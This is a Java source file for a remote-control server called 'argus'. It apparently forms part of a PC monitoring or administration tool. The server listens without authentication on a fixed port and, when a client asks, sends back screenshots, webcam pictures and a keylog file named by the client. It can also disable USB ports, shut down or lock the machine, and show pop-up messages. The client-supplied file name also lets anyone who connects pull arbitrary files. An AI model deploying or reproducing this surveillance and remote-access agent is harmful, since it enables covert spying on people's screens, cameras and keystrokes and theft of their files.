package argus;

import java.awt.AWTException;
import java.awt.Dimension;
import java.awt.HeadlessException;
import java.awt.image.BufferedImage;
import java.io.BufferedOutputStream;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.PrintWriter;
import java.net.InetSocketAddress;
import java.net.ServerSocket;
import java.net.Socket;

import javax.imageio.ImageIO;
import javax.swing.JOptionPane;

import argus.modules.NotifyAccess;
import argus.modules.Power;
import argus.modules.QRCode;
import argus.modules.Screenshot;
import argus.modules.Usb;
import argus.util.Tray;

import com.github.sarxos.webcam.Webcam;

public class Server {

	static Webcam webcam = null;
	private static String SERVER_IP_FILENAME = "pinimda";

	private static void usbControls(int ch) throws IOException {
		ch = ch % 10;
		switch (ch) {
		case 0:
			System.out.println("ENABLE");
			Usb.enable();
			break;
		case 1:
			System.out.println("WRITE PROTECT / READ ONLY");
			Usb.writeProtect();
			break;
		case 2:
			System.out.println("DISABLE");
			Usb.disable();
			break;
		}
	}

	private static void powerControls(int ch) {
		ch = ch % 10;
		switch (ch) {
		case 0:
			System.out.println("LOCK");
			Power.lock();
			break;
		case 1:
			System.out.println("SHUTDOWN");
			Power.shutdown();
			break;
		case 2:
			System.out.println("RESTART");
			Power.restart();
			break;
		case 3:
			System.out.println("HIBERNATE");
			Power.hibernate();
			break;
		}
	}

	public static void sendFile(OutputStream os, File file) {
		int byteCount = 2048;
		byte[] buffer = new byte[byteCount];
		BufferedOutputStream bos = new BufferedOutputStream(os, byteCount);
		FileInputStream in = null;
		try {
			in = new FileInputStream(file);
			System.out.println(in.available());
		} catch (FileNotFoundException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}
		int i = 0, total = 0;
		System.out.println("About to start sending file");
		try {
			while ((i = in.read(buffer, 0, byteCount)) != -1) {
				total += i;
				System.out.print(i + "  ");
				bos.write(buffer, 0, i);
				bos.flush();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
		System.out.println("\nTotal:" + total);
		try {
			in.close();
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
	}

	public static void sendImage(OutputStream os, BufferedImage screen) {
		File file = new File("trans.png");
		try {
			ImageIO.write(screen, "png", file);
		} catch (IOException e) {
			System.out.println("Error in creating transfer file");
			e.printStackTrace();
		}
		sendFile(os, file);
	}

	private static void takeScreenshot(OutputStream os) {

		BufferedImage screen = null;
		try {
			screen = Screenshot.take();
		} catch (HeadlessException e) {
			e.printStackTrace();
		} catch (AWTException e) {
			e.printStackTrace();
		}
		sendImage(os, screen);

	}

	private static void displayMessage(final String msg) {
		Thread t = new Thread(new Runnable() {
			public void run() {
				JOptionPane.showMessageDialog(null, msg);
			}
		});
		t.start();
	}

	private static void openCamera() {
		if (webcam == null) {
			webcam = Webcam.getDefault();
			webcam.setViewSize(new Dimension(640, 480));
		}
		// BufferedImage image = webcam.getImage();
		if (!webcam.isOpen())
			webcam.open();
	}

	private static int takePicture(int ch, OutputStream os) {
		ch = ch % 10;
		switch (ch) {
		case 0:
			openCamera();
			break;
		case 1:
			if (webcam == null) {
				openCamera();
			}
			BufferedImage pic = webcam.getImage();
			sendImage(os, pic);
			break;
		case 2:
			if (webcam != null)
				webcam.close();
			webcam = null;
			break;
		case 3:
			PrintWriter pw = new PrintWriter(os);
			String open = ((webcam != null) && (webcam.isOpen())) ? "yes"
					: "no";
			pw.println(open);
			pw.flush();
			break;
		}
		return ch;
	}

	private static String checkIpFile() {
		File file = new File(SERVER_IP_FILENAME);
		if (file.exists()) {
			FileReader fr = null;
			try {
				fr = new FileReader(file);
				BufferedReader br = new BufferedReader(fr);
				String ip = "", line;
				while ((line = br.readLine()) != null) {
					System.out.println(line);
					ip += line;
				}
				br.close();
				return ip;
			} catch (FileNotFoundException e) {
				e.printStackTrace();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		return "0";
	}

	private static void sendKeylog(OutputStream os, String filename) {
		File file = new File(filename);
		BufferedOutputStream bos;
		byte[] b = "111".getBytes();
		int bytes = b.length;
		try {
			bos = new BufferedOutputStream(os, bytes);
			if (file.exists()) {
				bos.write(b, 0, bytes);
				bos.flush();
				sendFile(os, file);
			} else {
				b = "000".getBytes();
				bytes = b.length;
				bos.write(b, 0, bytes);
				bos.flush();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void main(String[] args) {
		System.out.println("Starting Server...");
		String serverIp;
		serverIp = checkIpFile();
		
		if (serverIp.equals("0")) QRCode.createIpAddressQR();
		 
		NotifyAccess.notifyAdmin(serverIp);
		Tray.addToTray();
		ServerSocket server = null;
		Socket client = null;
		BufferedReader cbr = null;
		OutputStream os = null;
		PrintWriter pw = null;
		int ch = -1;
		while (true) {
			try {
				server = new ServerSocket();
				server.setReuseAddress(true);
				server.bind(new InetSocketAddress(13579));
				server.setReuseAddress(true);
				client = server.accept();
				cbr = new BufferedReader(new InputStreamReader(
						client.getInputStream()));
				os = client.getOutputStream();
				ch = Integer.parseInt(cbr.readLine());
				System.out.println(ch);
				switch (ch) {
				case Controls.PING:
					String pingFromIp = cbr.readLine();
					System.out.println(pingFromIp);
					pw = new PrintWriter(os);
					pw.println(ch);
					pw.flush();
					if (pingFromIp.length() < 5)
						break;
					if (pingFromIp.equals(serverIp))
						break;
					try {
						FileWriter fw = new FileWriter(SERVER_IP_FILENAME);
						BufferedWriter bw = new BufferedWriter(fw);
						bw.write(pingFromIp);
						bw.close();
					} catch (IOException ioe) {
						ioe.printStackTrace();
					}
					break;
				case Controls.SCREENSHOT:
					takeScreenshot(os);
					break;
				case Controls.Usb.ENABLE:
				case Controls.Usb.DISABLE:
				case Controls.Usb.WRITE_PROTECT:
					usbControls(ch);
					break;
				case Controls.Camera.OPEN_CAMERA:
				case Controls.Camera.TAKE_PICTURE:
				case Controls.Camera.CLOSE_CAMERA:
				case Controls.Camera.CHECK_CAMERA:
					int i = -1;
					i = takePicture(ch, os);
					if (i == 0) {
						pw = new PrintWriter(os);
						pw.println(i);
						pw.flush();
					}
					break;
				case Controls.MESSAGE:
					System.out
							.println("Enter MESSAGE case. About to read message.");
					String msg = cbr.readLine();
					System.out.println("Message is: " + msg);
					displayMessage(msg);
					System.out.println(msg);
					break;
				case Controls.Power.LOCK:
				case Controls.Power.SHUTDOWN:
				case Controls.Power.RESTART:
				case Controls.Power.HIBERNATE:
					powerControls(ch);
					break;
				case Controls.KEYLOGGER:
					String keylogFile = cbr.readLine();
					System.out.println("Keylog file requested is: "
							+ keylogFile);
					sendKeylog(os, keylogFile);
					break;
				/*
				 * case Controls.LOCK_WORKSTATION: ScreenControl.on(); break;
				 */
				}
			} catch (IOException ioe) {
				System.out.println("IOOO");
				ioe.printStackTrace();
			} catch (Exception e) {
				if (ch / 10 == 3) {
					pw = new PrintWriter(os);
					pw.println(Controls.Camera.ERROR_CAMERA);
					pw.flush();
				}
				System.out.println("OOPS");
				e.printStackTrace();
			} finally {
				if (client != null) {
					try {
						client.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}
				if (server != null) {
					try {
						server.close();
					} catch (IOException e) {
						e.printStackTrace();
					}
				}

			}
		}
	}

	public class Controls {
		public static final int PING = 0;
		public static final int SCREENSHOT = 1;

		public class Usb {
			public static final int ENABLE = 20, WRITE_PROTECT = 21,
					DISABLE = 22;
		}

		public class Camera {
			public static final int OPEN_CAMERA = 30, TAKE_PICTURE = 31,
					CLOSE_CAMERA = 32, CHECK_CAMERA = 33, ERROR_CAMERA = 39;
		}

		public static final int MESSAGE = 4;

		public class Power {
			public static final int LOCK = 50, SHUTDOWN = 51, RESTART = 52,
					HIBERNATE = 53;
		}

		public static final int KEYLOGGER = 6;

		public static final int LOCK_WORKSTATION = 7;

	}
}
